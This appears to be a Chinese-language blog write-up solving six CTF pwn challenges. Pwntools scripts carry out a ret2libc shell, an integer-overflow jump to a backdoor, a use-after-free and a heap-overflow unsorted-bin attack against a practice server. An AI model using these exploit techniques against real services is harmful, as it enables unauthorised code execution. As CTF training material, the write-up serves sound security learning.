---
title: CUMT PWN专项
date: 2021-11-25 23:24:22
tags: [CTF,Pwn,Python]
categories: 
 - [CyberSecurity,CTF]
cover: https://res.cloudinary.com/sycamore/image/upload/v1682435935/Typera/2023/04/54a2923a541fe0c86555a91b264f4221.png
---

## pwn1

 都说了是测试nc了，连上就直接可以拿到flag

## pwn2
 给我们个password，你再传回去就完了
 关键是要仔细读题，看仔细到底哪些是password
```python
from pwn import *
r=remote("219.219.61.234",6666 )
print(r.recvuntil(b'*\n').decode())
p=r.recvuntil(b'\n')[:-1]
print(bytes(p))
r.sendline(bytes(p))
r.interactive()
```
## pwn3
ret2libc
泄露libc中puts函数的地址
传入puts_got，得到puts的运行时的地址，
用libc.symbols[“system”] - libc.symbols[“puts”]得到system和puts的距离，
加上之前接收的puts运行时的地址，得到system运行的地址，
然后直接用elf.search('sh\x00').__next__()找到sh的地址
没开canary，
0x38,所以payload填60个a,然后传system地址+sh地址，就可以getshell了
```python 
from pwn import *

#r = process(b'./pwn3')
r=remote('219.219.61.234',10003)
elf = ELF(b'./pwn3')
libc = ELF(b'./libc.so.6')

print(r.recv().decode())
puts_got = elf.got['puts']
print(puts_got)

r.send(str(puts_got).encode())
r.recvuntil(b' : ')
puts_addr = int(r.recvuntil(b'\n')[:-1],16)
print(puts_addr)

system_addr = puts_addr + libc.symbols["system"] - libc.symbols["puts"]
print(system_addr)

p = b'a'*60 + p32(system_addr) + p32(0xdeadbeef) + p32(elf.search(b'sh\x00').__next__())
r.recvuntil(b' :')
r.sendline(p)

r.interactive()
```
## pwn4
没开canary，但是前两个地方不能栈溢出，
![image-20230425232110426](https://res.cloudinary.com/sycamore/image/upload/v1682436075/Typera/2023/04/dc2c87519810519185f4e3c91622b01d.png)
而又观察到v3刚好是个unsigned int8型的变量，可以利用整数溢出的漏洞，
它的最大值位255，所以只要保证一共填了255+4 ~ +8之间的个数就行

```python
from pwn import *

#r = process('./pwn4')
r = remote("219.219.61.234",10004 )

backdoor=0x0804868B
p = b'a'*0x18 + p32(backdoor) + b'a'*(259-0x18-4)

r.recvuntil(b'choice:')
r.sendline(b'1')
r.recvuntil(b'username:')
r.sendline(b'123')
r.recvuntil(b'passwd:')
r.sendline(p)

r.interactive()
```
## pwn5
Use After Free漏洞
指针free之后没有置空，下次在访问该指针时能访问到原指针所指向的堆内容
添加两个note之后，依次释放。再创建大小为8的note时，内容部分对应被分配到第一个note里面，而它的指针没有置空，
所以如果我们在新的note里面放后门函数的地址的话，print新note的内容的时候，就会执行这个后门函数
```python
from pwn import *

#r = process(b'./pwn5')
r=remote('219.219.61.234',10000)

backdoor=0x08048986

def add(size,content):
    r.recvuntil(b':')
    r.sendline(b'1')
    r.recvuntil(b':')
    r.sendline(str(size))
    r.recvuntil(b':')
    r.send(content)

def delete(idx):
    r.recvuntil(b':')
    r.sendline(b'2')
    r.recvuntil(b':')
    r.sendline(str(idx))    

def Print(idx):
    r.recvuntil(b':')
    r.sendline(b'3')
    r.recvuntil(b':')
    r.sendline(str(idx))

add(32,'aaaa')
add(32,'aaaa')
delete(0)
delete(1)
add(8,p32(backdoor))
Print(0)

r.interactive()
```

## pwn6
堆溢出漏洞 + unsorted bin attack
只要控制v3=4869，同时控制qword_6020C0大于0x1305，就可以了
![image-20230425232125920](https://res.cloudinary.com/sycamore/image/upload/v1682436089/Typera/2023/04/d1aaf56f4760a578927720faa790c02a.png)
观察到v3=2对应的函数里面有堆溢出漏洞，所以可以利用堆溢出漏洞修改堆块的bk指针为qword_6020C0的地址-16

```python
from pwn import *

#r = process('./pwn6')
r = remote("219.219.61.234",10001 )
elf=ELF(B'./pwn6')

def create(size,content):
    r.recvuntil(b':')
    r.sendline(b'1')
    r.recvuntil(b':')
    r.sendline(str(size))
    r.recvuntil(b':')
    r.sendline(content)

def edit(idx,size,content):
    r.recvuntil(b':')
    r.sendline(b'2')
    r.recvuntil(b':')
    r.sendline(str(idx))
    r.recvuntil(b':')
    r.sendline(str(size))
    r.recvuntil(b':')
    r.sendline(content)

def delete(idx):
    r.recvuntil(b':')
    r.sendline(b'3')
    r.recvuntil(b':')
    r.sendline(str(idx))

create(0x20,'aaaa')
create(0x80,'bbbb')
create(0x20,'cccc')

delete(1)

magic = 0x6020C0
fd = 0
bk = magic -0x10

edit(0,0x40,b'a' * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk)) 

create(0x80,b'aaaa')
r.recvuntil(b':')
r.sendline(b'4869')

r.interactive()
```
